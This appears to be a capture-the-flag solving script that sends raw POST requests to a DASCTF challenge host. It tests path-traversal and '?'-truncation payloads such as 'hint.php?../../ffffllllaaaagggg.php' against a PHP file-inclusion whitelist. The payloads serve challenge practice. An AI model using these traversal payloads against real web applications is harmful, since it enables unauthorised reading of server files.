# -*- coding: utf-8 -*-
"""Raw POST 超时重试：? 字面时服务器在做什么"""
import socket

host = '29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com'
port = 80


def raw_post(body, timeout=25):
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    req = (
        f'POST / HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: {len(body)}\r\n'
        'Connection: close\r\n'
        'User-Agent: Mozilla/5.0\r\n\r\n'
        + body
    )
    s.sendall(req.encode())
    resp = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        return None, 'TIMEOUT'
    s.close()
    return resp, 'OK'


tests = [
    ('file=source.php', '白名单直过'),
    ('file=source.php?x', '?截断(字面)'),
    ('file=hint.php?../../ffffllllaaaagggg.php', '?截断+路径'),
    ('file=source.php%3fx', '?截断(%3f)'),
]

for body, label in tests:
    resp, status = raw_post(body)
    if resp is None:
        print(f'{label:<16} body={body:<40} -> 超时({status})')
        continue
    head, _, body_resp = resp.partition(b'\r\n\r\n')
    first = head.split(b'\r\n')[0].decode(errors='ignore')
    L = len(body_resp)
    if b'checkFile' in body_resp:
        result = 'include source.php 成功!'
    elif b'flag not here' in body_resp:
        result = 'include hint.php 成功!'
    elif L < 500:
        result = f'失败页({L}): {body_resp[:60].decode(errors="ignore")}'
    else:
        result = f'其他({L}): {body_resp[:100].decode(errors="ignore")}'
    print(f'{label:<16} body={body:<40} {first} len={L} -> {result}')
